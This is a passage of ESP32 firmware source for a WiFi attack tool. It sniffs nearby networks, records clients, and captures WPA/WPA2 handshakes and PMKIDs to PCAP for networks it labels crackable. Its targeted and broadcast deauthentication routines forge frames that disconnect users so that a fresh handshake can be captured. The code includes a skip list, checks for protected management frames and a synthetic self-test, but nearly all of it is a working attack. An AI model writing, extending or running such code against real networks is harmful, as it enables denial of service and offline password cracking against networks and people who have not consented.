static uint8_t processAssoc(const uint8_t *p, int len, int8_t rssi, uint8_t ch,
                            uint8_t apOut[6]) {
  if (apOut) memset(apOut, 0, 6);
  if (len < 28) return 0;
  if (((p[0] >> 2) & 0x03) != 0) return 0;  // management

  uint8_t subtype = (p[0] >> 4) & 0x0F;
  if (subtype != 0 && subtype != 2) return 0;  // assoc / reassoc request

  const uint8_t *ap = p + 4;   // addr1
  const uint8_t *sta = p + 10; // addr2
  if (isGroupMac(ap) || isGroupMac(sta) || isZeroMac(ap) || isZeroMac(sta)) return 0;
  if (apOut) memcpy(apOut, ap, 6);

  int pos = (subtype == 2) ? 34 : 28;  // reassoc adds current AP address
  char ssid[33] = {0};
  int ssidLen = 0;
  const uint8_t *pmkidList = nullptr;
  int pmkidCount = 0;
  bool rsnSeen = false;
  RsnInfo rsn = {AUTH_WPA2, false, false};

  while (pos + 2 <= len) {
    uint8_t id = p[pos];
    uint8_t l = p[pos + 1];
    if (pos + 2 + l > len) break;
    const uint8_t *ie = p + pos + 2;
    if (id == 0 && l > 0 && l <= 32) {
      memcpy(ssid, ie, l);
      ssidLen = l;
    } else if (id == 48) {
      rsnSeen = true;
      rsn = parseRsn(ie, l);
      pmkidCount = parseRsnPmkids(ie, l, &pmkidList);
    }
    pos += 2 + l;
  }
  ssid[ssidLen] = 0;

  if (ssidLen > 0) {
    ApInfo *before = findAp(ap);
    bool wasHidden = before && before->hidden;
    // The assoc request carries the SSID a hidden AP will not broadcast.
    // Never downgrade auth if this frame has no RSN IE.
    updateAp(ap, ssid, ssidLen, ch, rssi,
             rsnSeen ? rsn.auth : AUTH_UNKNOWN, false, !rsnSeen,
             rsnSeen && rsn.pmfCapable, rsnSeen && rsn.pmfRequired);
    ApInfo *after = findAp(ap);
    if (after && wasHidden) emitAp(*after, false);
  }

  uint8_t events = 0;
  if (pmkidList && pmkidCount > 0) {
    markApFlag(ap, false, true);
    ApInfo *ai = findAp(ap);
    char ssidOut[80] = "";
    char apStr[18];
    if (ai) jsonEscape(ai->ssid, ssidOut, sizeof(ssidOut));
    macStr(ap, apStr);

    for (int i = 0; i < pmkidCount; i++) {
      const uint8_t *pm = pmkidList + i * 16;
      char pmStr[33];
      for (int j = 0; j < 16; j++) snprintf(pmStr + j * 2, 3, "%02x", pm[j]);
      g_pmkidCount++;
      Serial.printf("{\"t\":\"pmkid\",\"ap\":\"%s\",\"ssid\":\"%s\",\"pmkid\":\"%s\",\"count\":%d,\"src\":\"assoc\"}\n",
                    apStr, ssidOut, pmStr, g_pmkidCount);
    }
    events |= EVENT_PMKID;
  }

  return events;
}

// ---------------------------------------------------------------- promiscuous RX
static bool beaconDue(const uint8_t *bssid, bool probeResponse) {
  uint32_t now = millis();
  uint32_t interval = probeResponse ? 500 : 3000;
  int freeIdx = -1;
  int oldest = 0;
  uint32_t oldestT = 0xFFFFFFFF;

  for (int i = 0; i < 64; i++) {
    if (!g_bt[i].used) {
      if (freeIdx < 0) freeIdx = i;
      continue;
    }
    if (sameMac(g_bt[i].bssid, bssid)) {
      if (now - g_bt[i].last < interval) return false;
      g_bt[i].last = now;
      return true;
    }
    if (g_bt[i].last < oldestT) {
      oldestT = g_bt[i].last;
      oldest = i;
    }
  }

  int idx = (freeIdx >= 0) ? freeIdx : oldest;
  g_bt[idx].used = true;
  memcpy(g_bt[idx].bssid, bssid, 6);
  g_bt[idx].last = now;
  return true;
}

static bool assocDue(const uint8_t *sta) {
  uint32_t now = millis();
  int freeIdx = -1;
  int oldest = 0;
  uint32_t oldestT = 0xFFFFFFFF;

  for (int i = 0; i < 16; i++) {
    if (!g_as[i].used) {
      if (freeIdx < 0) freeIdx = i;
      continue;
    }
    if (sameMac(g_as[i].sta, sta)) {
      if (now - g_as[i].last < 1000) return false;
      g_as[i].last = now;
      return true;
    }
    if (g_as[i].last < oldestT) {
      oldestT = g_as[i].last;
      oldest = i;
    }
  }

  int idx = (freeIdx >= 0) ? freeIdx : oldest;
  g_as[idx].used = true;
  memcpy(g_as[idx].sta, sta, 6);
  g_as[idx].last = now;
  return true;
}

static bool eapolFrame(const uint8_t *p, int len, int *hdrOut) {
  if (len < 32) return false;

  uint8_t fc0 = p[0];
  uint8_t fc1 = p[1];
  if (((fc0 >> 2) & 0x03) != 2) return false;

  uint8_t subtype = (fc0 >> 4) & 0x0F;
  bool toDS = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;

  int hdr = 24;
  if (toDS && fromDS) hdr += 6;
  if (subtype & 0x08) hdr += 2;
  if ((subtype & 0x08) && (fc1 & 0x80)) hdr += 4;
  if (hdr + 8 > len) return false;

  const uint8_t *llc = p + hdr;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
        llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
        llc[6] == 0x88 && llc[7] == 0x8E)) {
    return false;
  }
  *hdrOut = hdr;
  return true;
}

static void wifiRx(void *buf, wifi_promiscuous_pkt_type_t type) {
  (void)type;
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *p = pkt->payload;
  int len = (int)pkt->rx_ctrl.sig_len;
  // sig_len includes the 4-byte FCS. Strip it so the PCAP is a plain
  // 802.11 frame (radiotap link type 127) and the IE walker does not treat
  // the FCS as another information element.
  if (len > 4) len -= 4;
  if (len < 24) return;

  uint8_t fc0 = p[0];
  uint8_t fc1 = p[1];
  uint8_t ftype = (fc0 >> 2) & 0x03;
  uint8_t subtype = (fc0 >> 4) & 0x0F;

  Pkt out;
  bool want = false;

  if (ftype == 0 && (subtype == 8 || subtype == 5)) {
    // beacon or probe response
    const uint8_t *bssid = p + 10;
    if (beaconDue(bssid, subtype == 5)) {
      out.kind = PKT_BEACON;
      want = true;
    }
  } else if (ftype == 0 && (subtype == 0 || subtype == 2)) {
    // association / reassociation request: client, AP, and often SSID/PMKID
    if (len >= 28) {
      const uint8_t *ap = p + 4;
      const uint8_t *sta = p + 10;
      if (assocDue(sta)) {
        clientObserve(sta, ap, pkt->rx_ctrl.rssi, pkt->rx_ctrl.channel, OBS_ASSOC);
        out.kind = PKT_ASSOC;
        want = true;
      }
    }
  } else if (ftype == 2) {
    bool toDS = (fc1 & 0x01) != 0;
    bool fromDS = (fc1 & 0x02) != 0;

    // Learn the client/AP pair from ordinary data frames. Addresses are in
    // the clear even when the payload is encrypted.
    if (toDS != fromDS) {
      uint32_t now = millis();
      if (now - g_lastClientSample >= CLIENT_SAMPLE_MS) {
        g_lastClientSample = now;
        if (toDS) {
          clientObserve(p + 10, p + 4, pkt->rx_ctrl.rssi, pkt->rx_ctrl.channel, OBS_DATA);
        } else {
          clientObserve(p + 4, p + 10, pkt->rx_ctrl.rssi, pkt->rx_ctrl.channel, OBS_DATA);
        }
      }
    }

    int hdr = 0;
    if (eapolFrame(p, len, &hdr)) {
      out.kind = PKT_EAPOL;
      want = true;
    }
  }

  if (!want) return;

  int copy = len;
  if (copy > MAX_FRAME) copy = MAX_FRAME;

  out.len = (uint16_t)copy;
  out.origLen = (uint16_t)(len > 65535 ? 65535 : len);
  out.rssi = pkt->rx_ctrl.rssi;
  out.channel = pkt->rx_ctrl.channel;
  memcpy(out.data, p, copy);

  if (xQueueSend(g_queue, &out, 0) != pdTRUE) {
    g_drops++;
  }
}

// ---------------------------------------------------------------- channel / modes
static void setChannel(uint8_t ch) {
  if (ch < 1 || ch > 13) return;
  if (ch == g_channel) return;
  if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
    g_channel = ch;
  }
}

static void hop() {
  if (g_paused) return;

  if (g_boost && g_hasTarget && g_targetChannel) {
    setChannel(g_targetChannel);
    return;
  }
  if (g_lockMode) {
    setChannel(g_lockChannel);
    return;
  }

  uint32_t now = millis();
  if (now - g_lastHop < HOP_MS) return;
  g_lastHop = now;
  g_hopIdx = (g_hopIdx + 1) % (int)(sizeof(HOP_CHANNELS) / sizeof(HOP_CHANNELS[0]));
  setChannel(HOP_CHANNELS[g_hopIdx]);
}

static int strongestIndex(bool targetsOnly) {
  int best = -1;
  int8_t bestRssi = -128;
  for (int i = 0; i < g_apCount; i++) {
    if (g_aps[i].skipped) continue;
    if (targetsOnly && !isCrackableAuth(g_aps[i].auth)) continue;
    if (g_aps[i].hidden) continue;
    if (g_aps[i].rssi > bestRssi) {
      bestRssi = g_aps[i].rssi;
      best = i;
    }
  }
  if (best < 0) {
    for (int i = 0; i < g_apCount; i++) {
      if (g_aps[i].skipped) continue;
      if (targetsOnly && !isCrackableAuth(g_aps[i].auth)) continue;
      if (g_aps[i].rssi > bestRssi) {
        bestRssi = g_aps[i].rssi;
        best = i;
      }
    }
  }
  return best;
}

static void stopBoost(const char *reason) {
  if (!g_boost && !g_boostBroadcast) return;
  const char *mode = g_boostBroadcast ? "broadcast" : "client";
  g_boost = false;
  g_boostBroadcast = false;
  g_deauthBurstLeft = 0;
  g_deauthWaitingReported = false;
  Serial.printf("{\"t\":\"boost\",\"on\":0,\"mode\":\"%s\",\"reason\":\"%s\"}\n",
                mode, reason);
}

void snifferSetLock(bool lock, uint8_t channel) {
  g_lockMode = lock;
  if (channel >= 1 && channel <= 13) {
    g_lockChannel = channel;
    setChannel(channel);
  }
  Serial.printf("{\"t\":\"mode\",\"lock\":%d,\"ch\":%d}\n", lock ? 1 : 0, g_lockChannel);
}

bool snifferToggleLock() {
  if (g_lockMode) {
    snifferSetLock(false, 0);
    return false;
  }

  int idx = strongestIndex(true);
  if (idx < 0) idx = strongestIndex(false);
  if (idx < 0) {
    Serial.println("{\"t\":\"error\",\"msg\":\"no AP to lock\"}");
    return false;
  }

  g_lockChannel = g_aps[idx].channel;
  g_lockMode = true;
  setChannel(g_lockChannel);

  char ssid[80];
  char bssid[18];
  jsonEscape(g_aps[idx].ssid, ssid, sizeof(ssid));
  macStr(g_aps[idx].bssid, bssid);
  Serial.printf("{\"t\":\"mode\",\"lock\":1,\"ch\":%d,\"ssid\":\"%s\",\"bssid\":\"%s\"}\n",
                g_lockChannel, ssid, bssid);
  return true;
}

void snifferSetPaused(bool paused) {
  if (paused == g_paused) return;
  g_paused = paused;
  if (paused) {
    g_deauthBurstLeft = 0;
    esp_wifi_set_promiscuous(false);
    pcapClose();
  } else {
    esp_wifi_set_promiscuous(true);
    setChannel(g_channel);
    pcapOpen();
    g_deauthBurstLeft = 0;
    g_deauthNextAt = millis() + DEAUTH_COOLDOWN_MS;
  }
  Serial.printf("{\"t\":\"state\",\"paused\":%d}\n", paused ? 1 : 0);
}

bool snifferSelectTarget(int index) {
  if (index < 0 || index >= g_apCount) {
    Serial.println("{\"t\":\"error\",\"msg\":\"bad AP index\"}");
    return false;
  }
  return snifferSelectTargetBssid(g_aps[index].bssid);
}

bool snifferSelectTargetBssid(const uint8_t *bssid) {
  ApInfo *ap = findAp(bssid);
  if (!ap) {
    Serial.println("{\"t\":\"error\",\"msg\":\"AP not found\"}");
    return false;
  }
  if (ap->skipped) {
    Serial.println("{\"t\":\"error\",\"msg\":\"AP is in the skip list\"}");
    return false;
  }
  if (g_boost) stopBoost("target_changed");

  memcpy(g_targetBssid, ap->bssid, 6);
  strlcpy(g_targetSsid, ap->ssid, sizeof(g_targetSsid));
  g_targetChannel = ap->channel ? ap->channel : g_channel;
  g_targetRssi = ap->rssi;
  g_targetAuth = ap->auth;
  g_targetPmfRequired = ap->pmfRequired;
  g_targetSkipped = ap->skipped;
  g_hasTarget = true;
  g_lockMode = true;
  g_lockChannel = g_targetChannel;
  setChannel(g_targetChannel);
  g_deauthBurstLeft = 0;
  g_deauthNextAt = millis();

  char ssid[80];
  char bssidStr[18];
  jsonEscape(g_targetSsid, ssid, sizeof(ssid));
  macStr(g_targetBssid, bssidStr);
  Serial.printf("{\"t\":\"target\",\"ssid\":\"%s\",\"bssid\":\"%s\",\"ch\":%d,\"enc\":\"%s\",\"pmf\":\"%s\",\"skip\":%d}\n",
                ssid, bssidStr, g_targetChannel, authName(ap->auth),
                ap->pmfRequired ? "R" : (ap->pmfCapable ? "C" : "."),
                ap->skipped ? 1 : 0);
  if (!isCrackableAuth(ap->auth)) {
    Serial.println("{\"t\":\"warn\",\"msg\":\"target is not WPA/WPA2-PSK; no PSK handshake to capture\"}");
  }
  if (ap->pmfRequired) {
    Serial.println("{\"t\":\"warn\",\"msg\":\"target requires PMF; forged deauth will be ignored\"}");
  }
  return true;
}

static void refreshTargetFlags() {
  ApInfo *ap = findAp(g_targetBssid);
  if (!ap) return;
  g_targetAuth = ap->auth;
  g_targetPmfRequired = ap->pmfRequired;
  g_targetSkipped = ap->skipped;
}

static bool validateBoostTarget() {
  if (!g_hasTarget) {
    Serial.println("{\"t\":\"error\",\"msg\":\"select a target first\"}");
    return false;
  }
  refreshTargetFlags();
  if (g_targetSkipped) {
    Serial.println("{\"t\":\"error\",\"msg\":\"target is in the skip list\"}");
    return false;
  }
  if (g_targetPmfRequired) {
    Serial.println("{\"t\":\"error\",\"msg\":\"target requires PMF; deauth would be ignored\"}");
    return false;
  }
  if (!isCrackableAuth(g_targetAuth)) {
    Serial.println("{\"t\":\"error\",\"msg\":\"target has no PSK handshake to capture\"}");
    return false;
  }
  return true;
}

bool snifferSetBoost(bool on) {
  if (!on) {
    if (g_boost) {
      stopBoost("off");
    } else {
      Serial.println("{\"t\":\"boost\",\"on\":0,\"mode\":\"client\",\"reason\":\"off\"}");
    }
    return true;
  }
  if (!validateBoostTarget()) return false;
  if (g_boost) stopBoost("restart");

  g_boost = true;
  g_boostBroadcast = false;
  g_lockMode = true;
  g_lockChannel = g_targetChannel;
  setChannel(g_targetChannel);
  g_deauthBurstLeft = 0;
  g_deauthBurstsDone = 0;
  g_deauthWaitingReported = false;
  g_deauthNextAt = millis();

  char bssid[18];
  macStr(g_targetBssid, bssid);
  Serial.printf("{\"t\":\"boost\",\"on\":1,\"mode\":\"client\",\"target\":\"%s\",\"ch\":%d}\n",
                bssid, g_targetChannel);
  return true;
}

bool snifferSetBoostBroadcast(bool on) {
  if (!on) {
    if (g_boost && g_boostBroadcast) {
      stopBoost("off");
    } else {
      Serial.println("{\"t\":\"boost\",\"on\":0,\"mode\":\"broadcast\",\"reason\":\"off\"}");
    }
    return true;
  }
  if (!validateBoostTarget()) return false;
  if (g_boost) stopBoost("mode_changed");

  g_boost = true;
  g_boostBroadcast = true;
  g_lockMode = true;
  g_lockChannel = g_targetChannel;
  setChannel(g_targetChannel);
  g_lastDeauth = 0;
  g_deauthBurstLeft = 0;

  char bssid[18];
  macStr(g_targetBssid, bssid);
  Serial.printf("{\"t\":\"boost\",\"on\":1,\"mode\":\"broadcast\",\"target\":\"%s\",\"ch\":%d}\n",
                bssid, g_targetChannel);
  return true;
}

static bool sendDeauthFrame(const uint8_t *ap, const uint8_t *sta, bool fromAp,
                            uint16_t reason) {
  uint8_t frame[26] = {0xC0, 0x00, 0x00, 0x00};
  const uint8_t *a1 = fromAp ? sta : ap;
  const uint8_t *a2 = fromAp ? ap : sta;
  memcpy(frame + 4, a1, 6);
  memcpy(frame + 10, a2, 6);
  memcpy(frame + 16, ap, 6);

  uint16_t seq = g_deauthSeq++ & 0x0FFF;
  frame[22] = (uint8_t)((seq << 4) & 0xFF);
  frame[23] = (uint8_t)((seq >> 4) & 0xFF);
  frame[24] = (uint8_t)(reason & 0xFF);
  frame[25] = (uint8_t)(reason >> 8);

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
  if (err == ESP_OK) {
    g_deauthSent++;
    return true;
  }

  stopBoost("tx_failed");
  Serial.printf("{\"t\":\"error\",\"msg\":\"deauth tx failed\",\"code\":%d}\n", (int)err);
  return false;
}

static int pickClientForTarget() {
  uint32_t now = millis();
  int best = -1;
  uint32_t bestAge = 0xFFFFFFFF;
  int8_t bestRssi = -128;

  for (int i = 0; i < g_clientCount; i++) {
    ClientInfo &c = g_clients[i];
    if (!c.used) continue;
    if (!sameMac(c.ap, g_targetBssid)) continue;
    uint32_t age = now - c.lastSeen;
    if (age > CLIENT_ACTIVE_MS) continue;
    if (age < bestAge || (age == bestAge && c.rssi > bestRssi)) {
      bestAge = age;
      bestRssi = c.rssi;
      best = i;
    }
  }
  return best;
}

static void maybeTargetedDeauth() {
  uint32_t now = millis();

  if (g_deauthBurstLeft > 0) {
    if (!timeReached(now, g_deauthNextAt)) return;

    bool fromAp = (g_deauthDir == 0);
    uint16_t reason = fromAp ? 7 : 3;
    if (!sendDeauthFrame(g_targetBssid, g_deauthClient, fromAp, reason)) return;

    g_deauthDir ^= 1;
    g_deauthBurstLeft--;
    g_deauthNextAt = now + DEAUTH_BURST_GAP_MS;

    if (g_deauthBurstLeft == 0) {
      g_deauthBursts++;
      g_deauthBurstsDone++;
      char apStr[18], staStr[18];
      macStr(g_targetBssid, apStr);
      macStr(g_deauthClient, staStr);
      Serial.printf("{\"t\":\"deauth\",\"ap\":\"%s\",\"client\":\"%s\",\"frames\":%d,\"burst\":%u}\n",
                    apStr, staStr, DEAUTH_BURST_FRAMES, (unsigned)g_deauthBurstsDone);
      if (g_deauthBurstsDone >= DEAUTH_MAX_BURSTS) {
        stopBoost("max_bursts");
        return;
      }
      g_deauthNextAt = now + DEAUTH_COOLDOWN_MS;
    }
    return;
  }

  if (!timeReached(now, g_deauthNextAt)) return;

  int idx = pickClientForTarget();
  if (idx < 0) {
    if (!g_deauthWaitingReported) {
      g_deauthWaitingReported = true;
      char apStr[18];
      macStr(g_targetBssid, apStr);
      Serial.printf("{\"t\":\"deauth\",\"state\":\"waiting_client\",\"ap\":\"%s\"}\n", apStr);
    }
    g_deauthNextAt = now + DEAUTH_WAIT_MS;
    return;
  }

  memcpy(g_deauthClient, g_clients[idx].mac, 6);
  g_deauthBurstLeft = DEAUTH_BURST_FRAMES;
  g_deauthDir = 0;
  g_deauthWaitingReported = false;
  g_deauthNextAt = now;
}

static void maybeBroadcastDeauth() {
  uint32_t now = millis();
  if (!timeReached(now, g_lastDeauth + DEAUTH_INTERVAL_MS) && g_lastDeauth != 0) return;
  g_lastDeauth = now;
  static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  sendDeauthFrame(g_targetBssid, bcast, true, 7);
}

static void maybeDeauth() {
  if (!g_boost || !g_hasTarget || g_paused) return;
  if (g_channel != g_targetChannel) {
    setChannel(g_targetChannel);
    return;
  }
  if (g_boostBroadcast) {
    maybeBroadcastDeauth();
  } else {
    maybeTargetedDeauth();
  }
}

// ---------------------------------------------------------------- public API
bool snifferBegin() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false);
  delay(50);

  loadSkipList();

  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_bandwidth(WIFI_IF_STA, WIFI_BW_HT20);

  g_queue = xQueueCreate(PKT_QUEUE_LEN, sizeof(Pkt));
  if (!g_queue) {
    Serial.println("{\"t\":\"error\",\"msg\":\"queue alloc failed\"}");
    return false;
  }

  g_clientQueue = xQueueCreate(CLIENT_QUEUE_LEN, sizeof(ClientObs));
  if (!g_clientQueue) {
    Serial.println("{\"t\":\"error\",\"msg\":\"client queue alloc failed\"}");
    return false;
  }

  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;

  esp_err_t err = esp_wifi_set_promiscuous_filter(&filter);
  if (err != ESP_OK) {
    Serial.printf("{\"t\":\"error\",\"msg\":\"promisc filter\",\"code\":%d}\n", (int)err);
  }
  esp_wifi_set_promiscuous_rx_cb(wifiRx);

  err = esp_wifi_set_promiscuous(true);
  if (err != ESP_OK) {
    Serial.printf("{\"t\":\"error\",\"msg\":\"promisc on\",\"code\":%d}\n", (int)err);
    return false;
  }

  setChannel(1);
  sdTry();

  Serial.println("{\"t\":\"sniffer\",\"ok\":1}");
  return true;
}

void snifferLoop() {
  ClientObs obs;
  int clientsDrained = 0;
  while (clientsDrained < 16 && xQueueReceive(g_clientQueue, &obs, 0) == pdTRUE) {
    updateClient(obs);
    clientsDrained++;
  }
  cleanupStaleClients();

  if (g_boost && g_hasTarget) {
    ApInfo *target = findAp(g_targetBssid);
    if (target && (target->pmfRequired || target->skipped)) {
      stopBoost("target_blocked");
    }
  }

  if (!g_paused) {
    hop();
    maybeDeauth();
  }

  Pkt pkt;
  int drained = 0;
  while (drained < 8 && xQueueReceive(g_queue, &pkt, 0) == pdTRUE) {
    uint8_t eventAp[6] = {0};
    uint8_t eventFlags = 0;

    if (pkt.kind == PKT_BEACON) {
      processBeacon(pkt.data, pkt.len, pkt.origLen, pkt.rssi, pkt.channel);
    } else if (pkt.kind == PKT_EAPOL) {
      eventFlags = processEapol(pkt.data, pkt.len, pkt.rssi, pkt.channel, eventAp);
    } else if (pkt.kind == PKT_ASSOC) {
      eventFlags = processAssoc(pkt.data, pkt.len, pkt.rssi, pkt.channel, eventAp);
    }

    bool wrote = pcapWrite(pkt);
    if (wrote && eventFlags) {
      if (eventFlags & EVENT_HS) g_savedHsCount++;
      if (eventFlags & EVENT_PMKID) g_savedPmkidCount++;
      pcapFlush();
      if (g_boost && sameMac(eventAp, g_targetBssid)) {
        stopBoost("captured");
      }
    }
    drained++;
  }

  if (!g_sdOk && millis() - g_lastSdTry > SD_RETRY_MS) {
    g_lastSdTry = millis();
    sdTry();
  }

  if (g_pcapOk && millis() - g_lastFlush > PCAP_FLUSH_MS) {
    pcapFlush();
  }
}

// ---------------------------------------------------------------- reporting
void snifferPrintStatus() {
  int targets = 0;
  int skips = 0;
  for (int i = 0; i < g_apCount; i++) {
    if (g_aps[i].skipped) skips++;
    else if (isCrackableAuth(g_aps[i].auth)) targets++;
  }

  uint32_t now = millis();
  int clientTotal = 0;
  int activeClients = 0;
  for (int i = 0; i < g_clientCount; i++) {
    if (!g_clients[i].used) continue;
    clientTotal++;
    if (now - g_clients[i].lastSeen <= CLIENT_ACTIVE_MS) {
      activeClients++;
    }
  }

  char tssid[80] = "";
  char tbssid[18] = "";
  if (g_hasTarget) {
    jsonEscape(g_targetSsid, tssid, sizeof(tssid));
    macStr(g_targetBssid, tbssid);
  }

  Serial.printf("{\"t\":\"stat\",\"ms\":%lu,\"aps\":%d,\"hs\":%d,\"saved\":%d,\"pmkid\":%d,\"saved_pmkid\":%d,\"eapol\":%d,"
                "\"targets\":%d,\"skips\":%d,\"clients\":%d,\"active\":%d,\"ch\":%d,\"sd\":%d,\"pcap\":%u,\"drops\":%u,"
                "\"client_drops\":%u,\"paused\":%d,\"lock\":%d,\"boost\":%d,\"boost_bcast\":%d,"
                "\"target\":\"%s\",\"target_ch\":%d,\"deauth\":%u,\"bursts\":%u}\n",
                (unsigned long)millis(), g_apCount, g_hsCount, g_savedHsCount,
                g_pmkidCount, g_savedPmkidCount, g_eapolCount,
                targets, skips, clientTotal, activeClients,
                g_channel, g_sdOk ? 1 : 0, (unsigned)g_pcapSize,
                (unsigned)g_drops, (unsigned)g_clientDrops,
                g_paused ? 1 : 0, g_lockMode ? 1 : 0,
                g_boost ? 1 : 0, (g_boost && g_boostBroadcast) ? 1 : 0,
                tbssid, g_targetChannel, (unsigned)g_deauthSent,
                (unsigned)g_deauthBursts);
}

void snifferPrintAps() {
  Serial.printf("%-3s %-32s %-17s %2s %4s %-7s %-3s %-4s %s %s\n",
                "#", "SSID", "BSSID", "CH", "dBm", "ENC", "PMF", "SKIP", "HS", "PMK");
  for (int i = 0; i < g_apCount; i++) {
    ApInfo &a = g_aps[i];
    char bssid[18];
    macStr(a.bssid, bssid);
    Serial.printf("%-3d %-32.32s %-17s %2d %4d %-7s %-3s %-4s %s %s\n",
                  i, a.ssid[0] ? a.ssid : "<hidden>", bssid, a.channel,
                  a.rssi, authName(a.auth),
                  a.pmfRequired ? "R" : (a.pmfCapable ? "C" : "."),
                  a.skipped ? "Y" : ".",
                  a.handshake ? "Y" : ".", a.pmkid ? "Y" : ".");
  }
}

void snifferPrintClients() {
  uint32_t now = millis();
  Serial.printf("%-3s %-17s %-17s %2s %4s %5s %5s %s\n",
                "#", "CLIENT", "AP", "CH", "dBm", "AGE", "OBS", "FLAGS");
  for (int i = 0; i < g_clientCount; i++) {
    ClientInfo &c = g_clients[i];
    if (!c.used) continue;
    char mac[18], ap[18];
    macStr(c.mac, mac);
    macStr(c.ap, ap);
    char flags[4] = "..";
    if (c.flags & CLIENT_DATA) flags[0] = 'D';
    if (c.flags & CLIENT_ASSOC) flags[1] = 'A';
    Serial.printf("%-3d %-17s %-17s %2d %4d %4lus %5u %s\n",
                  i, mac, ap, c.channel, c.rssi,
                  (unsigned long)((now - c.lastSeen) / 1000),
                  (unsigned)c.observations, flags);
  }
}

void snifferPrintSkips() {
  Serial.printf("SKIP %d\n", g_skipCount);
  for (int i = 0; i < g_skipCount; i++) {
    Serial.println(g_skipSsids[i]);
  }
}

void snifferPrintPcap() {
  Serial.printf("{\"t\":\"pcap\",\"path\":\"%s\",\"size\":%u,\"open\":%d,\"sd\":%d}\n",
                g_pcapPath, (unsigned)g_pcapSize, g_pcapOk ? 1 : 0, g_sdOk ? 1 : 0);
}

// Feed synthetic frames through the same parser used for real traffic. This
// proves the handshake and PMKID state machines without transmitting
// anything. It changes the counters, so run `clear` afterwards.
void snifferSelfTest() {
  static const uint8_t ap1[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
  static const uint8_t sta1[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x02};
  static const uint8_t ap2[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x03};
  static const uint8_t sta2[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x04};
  static const uint8_t ap3[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x05};
  static const uint8_t sta3[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x06};
  static const uint8_t ap4[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x07};
  static const uint8_t sta4[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x08};
  uint8_t frame[160];

  auto build = [&](const uint8_t *ap, const uint8_t *sta, bool fromAp,
                   uint16_t keyInfo, bool withPmkid, uint64_t replay) {
    int n = 0;
    frame[n++] = 0x08;
    frame[n++] = fromAp ? 0x02 : 0x01;
    frame[n++] = 0x00;
    frame[n++] = 0x00;

    const uint8_t *a1 = fromAp ? sta : ap;
    const uint8_t *a2 = fromAp ? ap : sta;
    memcpy(frame + n, a1, 6); n += 6;
    memcpy(frame + n, a2, 6); n += 6;
    memcpy(frame + n, ap, 6); n += 6;
    frame[n++] = 0x00;
    frame[n++] = 0x00;

    static const uint8_t llc[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
    memcpy(frame + n, llc, 8);
    n += 8;

    uint8_t *e = frame + n;
    int kdLen = withPmkid ? 22 : 0;
    int bodyLen = 95 + kdLen;

    e[0] = 0x02;  // EAPOL version
    e[1] = 0x03;  // EAPOL-Key
    e[2] = bodyLen & 0xFF;
    e[3] = (bodyLen >> 8) & 0xFF;
    e[4] = 0x02;  // RSN key descriptor
    e[5] = keyInfo & 0xFF;
    e[6] = (keyInfo >> 8) & 0xFF;
    e[7] = 0x10;  // key length 16
    e[8] = 0x00;
    for (int i = 0; i < 8; i++) e[9 + i] = (uint8_t)((replay >> (8 * i)) & 0xFF);
    for (int i = 0; i < 32; i++) e[17 + i] = (uint8_t)(i + 1);  // nonce
    memset(e + 49, 0, 16); // IV
    memset(e + 65, 0, 8);  // RSC
    memset(e + 73, 0, 8);  // ID
    memset(e + 81, 0, 16); // MIC
    e[97] = kdLen & 0xFF;
    e[98] = (kdLen >> 8) & 0xFF;

    if (withPmkid) {
      uint8_t *kd = e + 99;
      kd[0] = 0xDD;
      kd[1] = 0x14;
      kd[2] = 0x00;
      kd[3] = 0x0F;
      kd[4] = 0xAC;
      kd[5] = 0x04;
      for (int i = 0; i < 16; i++) kd[6 + i] = (uint8_t)(0xA0 + i);
    }

    n += 99 + kdLen;
    uint8_t apOut[6];
    return processEapol(frame, n, -50, 6, apOut);
  };

  int hsBefore = g_hsCount;
  int pmkidBefore = g_pmkidCount;
  static uint64_t selftestReplay = 1;
  uint64_t base = selftestReplay;
  selftestReplay += 10;

  uint8_t valid = build(ap1, sta1, true, 0x002A, false, base);
  valid |= build(ap1, sta1, false, 0x004A, false, base);
  bool validHs = (valid & EVENT_HS) != 0;

  uint8_t mismatch = build(ap2, sta2, true, 0x002A, false, base + 1);
  mismatch |= build(ap2, sta2, false, 0x004A, false, base + 2);
  bool mismatchRejected = (mismatch & EVENT_HS) == 0;

  uint8_t pmkid = build(ap3, sta3, true, 0x002A, true, base + 3);
  bool pmkidOk = (pmkid & EVENT_PMKID) != 0;

  uint8_t m2m3 = build(ap4, sta4, false, 0x004A, false, base + 4);
  m2m3 |= build(ap4, sta4, true, 0x0078, false, base + 5);
  bool m2m3Ok = (m2m3 & EVENT_HS) != 0;

  bool skipOk = !isSkippedSsid("ExampleNet");
  if (g_skipCount > 0) {
    skipOk = skipOk && isSkippedSsid(g_skipSsids[0]);
  }

  static const uint8_t expectedPmkid[16] = {
      0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
      0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF};
  uint8_t rsnPmkid[38] = {
      0x01, 0x00,                    // version
      0x00, 0x0F, 0xAC, 0x04,        // group cipher
      0x01, 0x00,                    // pairwise count
      0x00, 0x0F, 0xAC, 0x04,        // pairwise cipher
      0x01, 0x00,                    // AKM count
      0x00, 0x0F, 0xAC, 0x02,        // PSK AKM
